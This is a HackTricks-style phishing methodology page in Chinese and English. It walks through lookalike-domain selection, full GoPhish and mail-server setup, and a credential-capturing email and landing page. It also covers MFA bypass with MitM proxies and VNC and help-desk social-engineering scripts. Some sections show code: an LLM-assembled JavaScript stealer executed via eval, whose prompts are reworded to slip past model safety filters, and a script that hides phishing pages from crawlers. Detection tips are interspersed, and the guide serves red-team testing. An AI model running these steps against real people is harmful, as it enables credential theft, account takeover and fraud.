# 钓鱼方法论

{{#include ../../banners/hacktricks-training.md}}

## 方法论

1. 侦察受害者
1. 选择目标域名（victim domain）。
2. 执行一些基础的 web 枚举，搜索受害者使用的登录门户（searching for login portals），并决定要冒充哪个门户（impersonate）。
3. 使用 OSINT 查找邮箱地址（find emails）。
2. 准备环境
1. 购买用于钓鱼评估的域名（Buy the domain）。
2. 配置与邮件服务相关的记录（SPF, DMARC, DKIM, rDNS）。
3. 在 VPS 上配置 gophish。
3. 准备活动
1. 准备邮件模板（email template）。
2. 准备用于窃取凭据的网页（web page）。
4. 发起活动！

## 生成相似域名或购买受信任域名

### 域名变体技术

- 关键字（Keyword）：域名包含原始域名的重要关键字（例如，zelster.com-management.com）。
- 连字符子域（hypened subdomain）：将子域名中的点改为连字符（例如，www-zelster.com）。
- 新 TLD（New TLD）：相同域名使用新的顶级域（例如，zelster.org）。
- 同形字（Homoglyph）：用外观相似的字母替换域名中的某个字母（例如，zelfser.com）。

{{#ref}}
homograph-attacks.md
{{#endref}}
- 字母换位（Transposition）：在域名中交换两个字母（例如，zelsetr.com）。
- 单复数形式（Singularization/Pluralization）：在域名末尾添加或移除 “s”（例如，zeltsers.com）。
- 省略（Omission）：从域名中删除一个字母（例如，zelser.com）。
- 重复（Repetition）：在域名中重复某个字母（例如，zeltsser.com）。
- 替换（Replacement）：类似 homoglyph 但不那么隐蔽。用另一个字母替换域名中的某个字母，可能是键盘上邻近的字母（例如，zektser.com）。
- 子域化（Subdomained）：在域名中加入一个点（例如，ze.lster.com）。
- 插入（Insertion）：在域名中插入一个字母（例如，zerltser.com）。
- 缺少点（Missing dot）：在域名后追加 TLD（例如，zelstercom.com）

**自动化工具**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**网站**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

存在一种可能性：由于太阳耀斑、宇宙射线或硬件错误等各种因素，存储或通信中的某些比特可能会自动翻转（bit get automatically flipped）。

当该概念应用于 DNS 请求时，DNS 服务器接收到的域名可能与最初请求的域名不同。

例如，域名 "windows.com" 中单个比特的修改可能会将其变为 "windnws.com"。

攻击者可能会通过注册多个与受害者域名相似的 bit-flipping 域名来利用这一点。他们的目的是将合法用户重定向到他们自己的基础设施。

欲了解更多信息，请阅读 [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### 购买受信任域名

你可以在 [https://www.expireddomains.net/](https://www.expireddomains.net) 搜索可用的过期域名以供使用。\
为了确保你将要购买的过期域名已经具有良好的 SEO，你可以在以下站点查看它的分类：

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## 发现邮箱地址

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

为了发现更多有效邮箱地址或验证已发现的地址，你可以尝试对受害者的 SMTP 服务器进行暴力枚举（brute-force them smtp servers）。[在此了解如何验证/发现邮箱地址](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)。\
此外，别忘了如果用户使用任何 web 门户访问其邮件，你可以检查该门户是否易受用户名暴力破解（username brute force），并在可能的情况下利用该漏洞。

## Configuring GoPhish

### Installation

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
You will be given a password for the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password. You may need to tunnel that port to local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### 配置

**TLS 证书配置**

在此步骤之前，你应该**已经购买好要使用的 domain**，并且它必须**指向**你配置 **gophish** 的 **VPS 的 IP**。
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**邮件配置**

开始安装：`apt-get install postfix`

然后将域添加到以下文件：

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**还要更改 /etc/postfix/main.cf 中以下变量的值**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

最后将文件 **`/etc/hostname`** 和 **`/etc/mailname`** 修改为你的域名，并**重启你的 VPS。**

现在，创建一个 **DNS A record**，将 `mail.<domain>` 指向 VPS 的 **IP 地址**，并创建一个指向 `mail.<domain>` 的 **DNS MX** 记录

现在测试发送电子邮件：
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish 配置**

停止 gophish 的执行并进行配置。\
将 `/opt/gophish/config.json` 修改为如下内容（注意使用 https）：
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**配置 gophish 服务**

为了创建 gophish 服务，使其能够自动启动并作为一个 service 进行管理，你可以创建文件 `/etc/init.d/gophish`，内容如下：
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
完成配置该服务并检查其运行情况：
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## 配置邮件服务器和域名

### 等待并保持可信

域名越老，被判为垃圾邮件的可能性越低。因此你应尽可能长时间等待（至少 1week）再进行 phishing 评估。此外，如果你在站点上放置与声誉良好行业相关的页面，所获得的信誉会更好。

注意，即使你必须等待一周，你也可以现在完成所有配置。

### 配置反向 DNS (rDNS) 记录

设置一个 rDNS (PTR) 记录，将 VPS 的 IP 地址解析到域名。

### Sender Policy Framework (SPF) 记录

你必须 **为新域配置 SPF 记录**。如果你不知道什么是 SPF 记录 [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf)。

你可以使用 [https://www.spfwizard.net/](https://www.spfwizard.net) 来生成你的 SPF 策略（使用 VPS 机器的 IP）

![](<../../images/image (1037).png>)

下面是必须在域名的 TXT 记录中设置的内容：
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### 基于域的邮件认证、报告与一致性 (DMARC) 记录

你必须 **为新域名配置 DMARC 记录**。如果你不知道什么是 DMARC 记录 [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

你需要创建一个新的 DNS TXT 记录，指向主机名 `_dmarc.<domain>`，内容如下：
```bash
v=DMARC1; p=none
```
### 域名密钥识别邮件 (DKIM)

你必须 **为新域配置 DKIM**。如果你不知道什么是 DMARC 记录，请[**阅读此页面**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)。

本教程基于: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> 你需要将 DKIM 密钥生成的两个 B64 值连接起来：
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### 测试你的邮件配置得分

你可以使用 [https://www.mail-tester.com/](https://www.mail-tester.com/)\ 只需访问该页面并向他们给出的地址发送一封邮件：
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
你也可以通过发送一封邮件到 `check-auth@verifier.port25.com` 来**检查你的邮件配置**，并**阅读响应**（为此你需要**打开** port **25**，如果以 root 身份发送邮件，可以在文件 _/var/mail/root_ 中查看响应）。\
检查是否通过所有测试:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
你也可以**向你控制的 Gmail 发送消息**，并在你的 Gmail 收件箱中检查**电子邮件头**，在 `Authentication-Results` 头字段中应出现 `dkim=pass`。
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

The page [www.mail-tester.com](https://www.mail-tester.com) can indicate you if you your domain is being blocked by spamhouse. You can request your domain/IP to be removed at: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​You can request your domain/IP to be removed at [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- 为发送者配置设置一个**用来识别的名称**
- 决定你将从哪个账户发送钓鱼邮件。建议： _noreply, support, servicedesk, salesforce..._
- 用户名和密码可以留空，但确保勾选 Ignore Certificate Errors

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> 推荐使用“**Send Test Email**”功能来测试一切是否正常。\
> 我建议将**测试邮件发送到 10min mails 地址**，以避免在测试时被列入黑名单。

### Email Template

- 为模板设置一个**用来识别的名称**
- 然后写一个**主题**（不要写奇怪的内容，就像你在普通邮件里会看到的那种）
- 确保已勾选“**Add Tracking Image**”
- 编写**邮件模板**（你可以像下面示例一样使用变量）:
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
请注意，**为了提高邮件的可信度**，建议使用来自客户邮件中的某些签名。建议：

- 向一个**不存在的地址**发送邮件，查看回复中是否包含任何签名。
- 搜索一些**公开的邮箱**，例如 info@ex.com、press@ex.com 或 public@ex.com，向它们发送邮件并等待回复。
- 尝试联系一些**已发现的有效**邮箱并等待回复。

![](<../../images/image (80).png>)

> [!TIP]
> Email Template 还允许 **附加要发送的文件**。如果你还想通过一些特制的文件/文档窃取 NTLM challenges，请[阅读此页面](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)。

### Landing Page

- 写一个**名称**
- **Write the HTML code** 网页的 HTML 代码。注意你可以**导入**网页。
- 勾选 **Capture Submitted Data** 和 **Capture Passwords**
- 设置一个**重定向**

![](<../../images/image (826).png>)

> [!TIP]
> 通常你需要修改页面的 HTML code 并在本地做一些测试（可能使用 Apache server）**直到达到满意的效果。**然后把那个 HTML code 写到输入框中。\
> 注意如果你需要为 HTML 使用一些静态资源（比如一些 CSS 和 JS 页面），可以将它们保存到 _**/opt/gophish/static/endpoint**_，然后从 _**/static/\<filename>**_ 访问它们。

> [!TIP]
> 对于重定向，你可以**将用户重定向到受害者的真实主站页面**，或者重定向到 _/static/migration.html_ 比如，放一个**旋转等待图（**[**https://loading.io/**](https://loading.io)**）持续 5 秒，然后提示流程已成功**。**

### Users & Groups

- 设置一个名称
- **Import the data**（注意，为了在示例中使用模板，你需要每个用户的 firstname、last name 和 email address）

![](<../../images/image (163).png>)

### Campaign

最后，创建一个 campaign，选择名称、email template、landing page、URL、sending profile 和 group。注意 URL 将是发送给受害者的链接。

注意 **Sending Profile 允许发送测试邮件以查看最终的 phishing 邮件效果**：

![](<../../images/image (192).png>)

> [!TIP]
> 我建议将测试邮件发送到 10min mails addresses，以避免在测试时被列入黑名单。

一切准备就绪后，直接启动 campaign！

## Website Cloning

如果出于任何原因你想 clone the website，请查看以下页面：

{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

在一些 phishing 测评中（主要是 Red Teams），你可能也想**发送包含某种后门的文件**（可能是一个 C2，或者只是触发某种认证的东西）。\
有关示例，请查看以下页面：

{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

前面的攻击相当巧妙，因为你伪造了一个真实网站并收集用户提交的信息。不幸的是，如果用户没有输入正确的密码，或者你伪造的应用启用了 2FA，**这些信息将不足以让你冒充被欺骗的用户**。

这时像 [**evilginx2**](https://github.com/kgretzky/evilginx2)**、**[**CredSniper**](https://github.com/ustayready/CredSniper) 和 [**muraena**](https://github.com/muraenateam/muraena) 这样的工具就很有用。该类工具可以让你生成类似 MitM 的攻击。基本上，攻击按以下方式工作：

1. 你**冒充真实网页的登录**表单。
2. 用户将他的**credentials**发送到你的伪造页面，工具会将这些信息转发到真实网页，**检查 credentials 是否有效**。
3. 如果账户配置了 **2FA**，MitM 页面会请求它，一旦**用户输入**，工具会将其发送到真实网页。
4. 一旦用户认证成功，你（作为攻击者）将**捕获到 credentials、2FA、cookie 以及在工具进行 MitM 期间的所有交互信息**。

### Via VNC

如果你不是**把受害者导向一个外观相同的恶意页面**，而是把他带到一个**在 VNC 会话中连接到真实网页的浏览器**呢？你就可以看到他的操作，窃取密码、使用的 MFA、cookies……\
你可以使用 [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) 来做到这一点。

## Detecting the detection

显然，判断自己是否被发现的最佳方式之一是**在黑名单中搜索你的域名**。如果出现列出，说明某种程度上你的域名被识别为可疑。\
一种简单的检查域名是否出现在任一黑名单的方法是使用 [https://malwareworld.com/](https://malwareworld.com)

然而，还有其他方法可以判断受害者是否正在**主动寻找互联网上的可疑 phishing 活动**，如以下所述：

{{#ref}}
detecting-phising.md
{{#endref}}

你可以**购买一个与受害者域名非常相似的域名**和/或为你控制的某个域名的**子域生成证书**，该子域名中包含受害者域名的**关键字**。如果**受害者**对它们执行任何形式的 **DNS 或 HTTP 交互**，你就会知道**他正在积极寻找**可疑域名，这种情况下你需要更加隐蔽。

### Evaluate the phishing

使用 [**Phishious**](https://github.com/Rices/Phishious) 来评估你的邮件是否会进入垃圾邮件文件夹、被阻断或成功到达收件人。

## High-Touch Identity Compromise (Help-Desk MFA Reset)

现代入侵组织越来越多地完全跳过邮件诱饵，**直接针对 service-desk / identity-recovery 工作流程**以绕过 MFA。该攻击完全“以合法工具为主”：一旦操作者获得有效凭证，就使用内置的管理工具进行横向转移——不需要恶意软件。

### Attack flow
1. Recon the victim
* 从 LinkedIn、数据泄露、公开的 GitHub 等处收集个人和公司信息。
* 确定高价值身份（高管、IT、财务）并枚举密码 / MFA 重置的**确切 help-desk 流程**。
2. 实时社工
* 通过电话、Teams 或聊天联系 help-desk，冒充目标（通常使用**伪造的来电显示**或**克隆的声音**）。
* 提供之前收集的 PII 来通过基于知识的验证。
* 说服代理**重置 MFA secret**或对注册的手机号执行**SIM-swap**。
3. 立即的访问后操作（真实案例中 ≤60 分钟）
* 通过任何 web SSO 门户建立立足点。
* 使用内置工具枚举 AD / AzureAD（不投放二进制文件）：
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* 使用 **WMI**、**PsExec** 或已在环境中被白名单的合法 **RMM** 代理进行横向移动。

### Detection & Mitigation
* 将 help-desk identity recovery 视为一种**特权操作**——要求 step-up auth 与经理审批。
* 部署 **Identity Threat Detection & Response (ITDR)** / **UEBA** 规则，告警以下行为：
* MFA 方法更改 + 来自新设备/地理位置的认证。
* 同一主体（用户→管理员）的立即提升。
* 记录 help-desk 通话，并在任何重置之前强制**回拨到已注册号码**。
* 实施 **Just-In-Time (JIT) / Privileged Access**，以使新重置的账户**不会**自动继承高权限令牌。

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
普通团队通过大规模攻击将**搜索引擎和广告网络变成投放渠道**来抵销高接触操作的成本。

1. **SEO poisoning / malvertising** 将一个伪造结果（例如 `chromium-update[.]site`）推到搜索广告顶部。
2. 受害者下载一个小型的**第一阶段加载器**（通常是 JS/HTA/ISO）。Unit 42 看到的示例包括：
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. 加载器外渗浏览器 cookies + credential DBs，然后拉取一个**静默加载器**，实时决定是否部署：
* RAT（例如 AsyncRAT、RustDesk）
* ransomware / wiper
* 持久化组件（注册表 Run 键 + 计划任务）

### Hardening tips
* 阻断新注册域名，并在搜索广告以及电子邮件上强制执行 **Advanced DNS / URL Filtering**。
* 限制软件安装为签名的 MSI / Store 包，通过策略禁止 `HTA`、`ISO`、`VBS` 的执行。
* 监控浏览器的子进程打开安装程序的情况：
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* 搜索经常被第一阶段加载器滥用的 LOLBins（例如 `regsvr32`、`curl`、`mshta`）。

---

## AI-Enhanced Phishing Operations
攻击者现在将 **LLM & voice-clone APIs** 串联起来，进行高度个性化的诱饵和实时交互。

| Layer | Example use by threat actor |
|-------|-----------------------------|
| 自动化 (Automation) | 生成并发送 >100k 封邮件 / SMS，使用随机化措辞和跟踪链接。|
| 生成式 AI (Generative AI) | 生成一次性邮件，引用公开的并购信息、社交媒体上的内部段子；回拨诈骗中使用 deep-fake CEO 的声音。|
| Agentic AI | 自动注册域名、抓取开源情报、当受害者点击但未提交凭证时自动生成下一阶段邮件。|

**防御：**
• 添加 **动态横幅**，突出显示来自不受信任自动化的消息（通过 ARC/DKIM 异常）。  
• 为高风险电话请求部署 **voice-biometric challenge phrases**。  
• 在意识培训中持续模拟 AI 生成的诱饵——静态模板已过时。

另见 – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

另见 – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

攻击者可以发送看起来无害的 HTML，并通过向**受信任的 LLM API**请求 JavaScript 在运行时**生成 stealer**，然后在浏览器中执行它（例如使用 `eval` 或动态 `<script>`）。

1. **Prompt-as-obfuscation：** 在 prompt 中对外联 URL/Base64 字符串进行编码；反复调整措辞以绕过安全过滤并减少幻觉。
2. **Client-side API call：** 加载时，JS 调用公共 LLM（Gemini/DeepSeek/etc.）或 CDN 代理；静态 HTML 中只有 prompt/API 调用。
3. **Assemble & exec：** 拼接响应并执行（每次访问多态）。
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** 生成的代码会个性化诱饵（例如，LogoKit token parsing）并 posts creds 到 prompt-hidden endpoint。

**Evasion traits**
- 流量访问知名的 LLM 域名或可信的 CDN 代理；有时通过 WebSockets 到后端。
- 无静态 payload；恶意 JS 仅在渲染后存在。
- 非确定性生成在每个会话产生 **唯一的** stealers。

**Detection ideas**
- 在启用 JS 的 sandboxes 中运行；对来自 LLM 响应的 **runtime `eval`/dynamic script creation** 触发告警。
- 搜索前端对 LLM APIs 的 POSTs，紧接着对返回文本调用 `eval`/`Function`。
- 对客户端流量中未授权的 LLM 域名以及随后发生的 credential POSTs 发出告警。

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Besides classic push-bombing, operators simply **force a new MFA registration** during the help-desk call, nullifying the user’s existing token.  Any subsequent login prompt appears legitimate to the victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
监控 AzureAD/AWS/Okta 事件：当 **`deleteMFA` + `addMFA`** 在 **同一 IP 的数分钟内** 连续发生时。

## Clipboard Hijacking / Pastejacking

攻击者可以静默地将恶意命令从被入侵或 typosquatted 的网页复制到受害者的剪贴板，然后诱导用户在 **Win + R**、**Win + X** 或终端窗口中粘贴并执行，从而在无需下载或附件的情况下执行任意代码。

{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Mobile‑gated phishing to evade crawlers/sandboxes
运营者越来越多地在钓鱼流程前加设简单的设备检查，以便桌面 crawlers 永远无法到达最终页面。常见做法是一个小脚本检测是否存在 touch-capable DOM，并把结果 post 到 server endpoint；非移动客户端会收到 HTTP 500（或空白页），而移动用户则能看到完整流程。

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` 的逻辑（简化）:
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
常见的服务器行为：
- 在首次加载时设置会话 cookie。
- 接受 `POST /detect {"is_mobile":true|false}`。
- 当 `is_mobile=false` 时，对后续的 GET 返回 500（或占位页面）；仅当为 `true` 时提供 phishing 页面。

侦测与狩猎启发式：
- urlscan 查询： `filename:"detect_device.js" AND page.status:500`
- Web 远程遥测：`GET /static/detect_device.js` → `POST /detect` → 对非‑mobile 返回 HTTP 500；合法的 mobile 受害者路径返回 200 并随后提供 HTML/JS。
- 对仅基于 `ontouchstart` 或类似设备检测来决定内容的页面进行阻断或严格审查。

防御建议：
- 使用类似移动设备指纹并启用 JS 的爬虫，以揭示被门控的内容。
- 对新注册域名上在 `POST /detect` 后出现的可疑 500 响应发出告警。

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)

{{#include ../../banners/hacktricks-training.md}}
